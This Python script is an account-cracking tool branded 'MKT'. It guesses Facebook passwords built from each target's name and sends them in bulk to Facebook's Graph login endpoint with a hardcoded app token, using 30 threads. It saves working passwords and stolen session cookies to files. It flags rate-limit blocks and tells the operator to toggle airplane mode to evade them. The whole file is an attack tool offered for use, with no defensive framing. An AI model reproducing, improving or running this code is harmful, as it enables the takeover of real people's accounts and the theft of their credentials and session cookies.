#!/usr/bin/python
#Original written By Mogid Khan
#MKT(Mogid Khan Termux) Brand

#Feel MKT POWER

import os,sys, requests, random, string,uuid,time,re
from concurrent.futures import ThreadPoolExecutor as TPE

Devices=requests.get("https://raw.githubusercontent.com/mogid458/MKT/main/Devices.txt").text.splitlines()

class Generate:
  def __init__(self):
    self.devices=requests.get("https://raw.githubusercontent.com/mogid458/MKT/main/Devices.txt").text.splitlines()
    self.networks = ["Telenor", "UFONE-PAKTel", "Zong", "Jazz", "SCO", "Jio", "Vodafone", "Airtel", "BSNL", "MTNL", "Grameenphone", "Robi", "Banglalink", "Teletalk", "Telkomsel", "Indosat Ooredoo", "Axiata", "Tri", "Smartfren", "China Mobile", "Unicom", "Telecom", "Satcom", "Docomo", "Rakuten", "IIJmio", "Orange"]
  
  def password(self,Name,passwords):
    password_list=[]
    
    splitted=Name.split()
    First=splitted[0]
    try:
      Last=splitted[-1]
    except:
      Last=First
    FIRST, LAST = First.upper(), Last.upper()
    first,last=First.lower(), Last.lower()
    name = Name.lower()
    NAME = Name.upper()
    
    for cpassword in passwords:
      cpassword=cpassword.replace("first", first).replace("last", last).replace("First", First).replace("Last", Last).replace("FIRST", FIRST).replace("LAST", LAST).replace("name", name).replace("Name", Name).replace("NAME", NAME)
      password_list.append(cpassword)
    
    return password_list
  
  def FBAN_UA(self):
    android_version=random.randint(5,15)
    device=random.choice(self.devices)
    FBAV=f"{random.randint(180,500)}.0.0.{random.randint(1,999)}.{random.randint(1,999)}"
    FBBV=random.randint(100000000,999999999)
    FBCR=random.choice(self.networks)
    ua=f"[FBAN/FB4A;FBAV/{FBAV};FBBV/{FBBV};FBDM/"+"{density=2.5,width=1440,height=980}"+f";FBLC/fi_ID;FBRV/0;FBCR/{FBCR};FBMF/Vivo;FBBD/Kindle;FBPN/com.facebook.katana;FBDV/{device};FBSV/{android_version};FBOP/5;FBCA/x64:arm-v8a;]"
    return ua

class Colors:
  def __init__(self):
    self.dark_green="\x1B[1;32m"
    self.light_green="\x1B[1;92m"
    self.dark_red="\x1B[1;31m"
    self.light_red="\x1B[1;91m"
    self.dark_blue="\x1B[1;34m"
    self.light_blue="\x1B[1;94m"
    self.dark_cyan="\x1B[1;36m"
    self.light_cyan="\x1B[1;96m"
    self.reset="\x1B[0;1m"
    
class Login:
  def __init__(self):
    self.color=Colors()
    self.loop=0
    self.ok=0
    self.cp=0 
    self.ip=self.color.light_green
    self.percent=0
    self.total=0
    self.Generate=Generate()
    
  def check_ip(self, response):
    if "Calls to this api have" in response or "The action attempted has been" in response:
      self.ip=self.color.light_red
      sys.exit()
    else:
      self.ip=self.color.light_green
  
  def show_id(self,status,user_id,password,color,cookies=""):
    print(f" {color[0]}({status}) {color[1]}{user_id} - {password}{self.color.reset}")
    print(f" {self.color.dark_blue}Cookie {self.color.dark_cyan}> {self.color.light_blue}{cookies}{self.color.reset}" if cookies!="" else "") 
  
  def save_id(self,status,user_id,password,cookies=""):
    open(f"/sdcard/MKT_FILE_{status}.txt","a").write(f"{user_id}|{password}{'|'+cookies if cookies!='' else ''}")
  
  def graph_meta_ads(self,user_id,passwords):
    self.loop+=1
    try:
      sys.stdout.write(f"\r ({self.color.light_blue}MKT {self.ip}•{self.color.reset} {self.color.light_blue}{self.loop}{self.color.reset}) <{self.color.dark_cyan}Graph {self.color.light_cyan}{user_id} {self.color.light_green}{self.ok}{self.color.reset}-{self.color.light_red}{self.cp}{self.color.reset}{self.color.reset}>")
      sys.stdout.flush()
      session=requests.Session()
      
      for password in passwords:
        data={
          "locale":"en_US",
          "format":"json",
          "email":user_id,
          "password":password,
          "access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28",
          "generate_session_cookies":"1"
          }
        header={
          "user-agent":"[FBAN/MobileAdsManagerAndroid;FBAV/242.0.0.49.82;FBBV/205122717;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/ro_RO;FBMF/LG;FBBD/LG;FBDV/LG-368Q;FBSV/5;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]",
          "Content-Type": "application/json;charset=utf-8",
          "Content-Length":str(len(str(data))),
          "Host": "graph.facebook.com",
          "Connection":"Keep-Alive",
          "Accept-Encoding":"gzip",
        }
        url="https://graph.facebook.com/auth/login"
        session.headers.update(header)
        response=session.post(url,data=data).text
        self.check_ip(response)
        
        if "session_key" in response:
          self.ok+=1
          jr=json.loads(response)
          c1=";".join(i["name"]+"="+i["value"] for i in jr["session_cookies"])
          cookies=f"sb={random.choices(string.ascii_letters+string.digits,k=24)};{c1}"
          self.show_id("OK",user_id,password,[self.color.dark_green,self.color.light_green],cookies)
          self.save_id("OK",user_id,password,cookies)
          break
          
        elif "User must verify their account" in response or "Login approval" in response or "Two factor" in response:
          self.cp+=1
          self.show_id("CP",user_id,password,[self.color.dark_red,self.color.light_red])
          self.save_id("CP",user_id,password)
          break
        else:continue
    except requests.exceptions.ConnectionError:
      time.sleep(10)
      self.graph(user_id,passwords)
    except Exception as error:
      pass
  
class Menu:
  def __init__(self):
    self.color=Colors()
    self.Generate=Generate()
    self.Login=Login()
    self.logo=f"""{self.color.light_blue}
 _  _ _  _ ___ 
 |\/| |_/   |  
 |  | | \_  |  
 © {self.color.light_cyan}Mogid Khan
 github > {self.color.light_green}mogid458{self.color.light_cyan}
 Version > {self.color.light_green}0.1{self.color.reset}\n"""
    self.file_path=""
    self.user_ids_passwords=[]
    
  def clear(self):
    os.system("clear")
    print(self.logo)
  
  def main(self):
    #Screen 1
    self.clear()
    try:
      self.file_path=input(f"{self.color.dark_blue} (?) File Path > {self.color.reset}")
      self.user_ids_passwords=open(self.file_path,"r").read().splitlines()
    except:
      print(f" ($) {self.color.dark_red} File not found {self.color.reset}")
      sys.exit()
    
    #Screen 2
    self.clear()
    print(f"""
 {self.color.dark_cyan}Indentifiers > {self.color.reset}
   First  Last > Default Names
   first  last > Names in small letter
   FIRST  LAST > Names in capital letter 
   Name > Default Full Name
   name > Full name in small letters
   NAME > Full name in capital letters
   
 {self.color.dark_cyan}Example > {self.color.reset}
  (1) first123 = first name in small letter+ 123
  (2) Name123 = Name + 123
    """)
    input(f" {self.color.dark_blue}(?) Continue > {self.color.reset}")
    
    #Screen 3
    self.clear()
    try:total_passwords=int(input(f" {self.color.dark_blue}(?) Total Passwords > {self.color.reset}"))
    except:total_passwords=2
    
    passwords=[]
    for i in range(total_passwords):
      password=input(f'  {self.color.light_cyan}(*) Password {i+1} > {self.color.reset}')
      passwords.append(password)
   
    #Screen 4
    self.clear()
    
    print(f""" {self.color.light_green}Cracking Started
 {self.color.dark_cyan}Total id > {self.color.light_green}{len(self.user_ids_passwords)}{self.color.reset}
 {self.color.dark_cyan}Switch Aeroplane mode after every few minutes{self.color.reset}\n\n""")
    with TPE(max_workers=30) as tp:
      for user_id_password in self.user_ids_passwords:
        try:
          user_id,Name=user_id_password.split("|")
          user_id,Name=user_id.strip(),Name.strip()
          crack_passwords=self.Generate.password(Name,passwords)
          tp.submit(self.Login.graph_meta_ads,user_id,crack_passwords)
        except Exception as error:
          print(error)
        
Menu().main()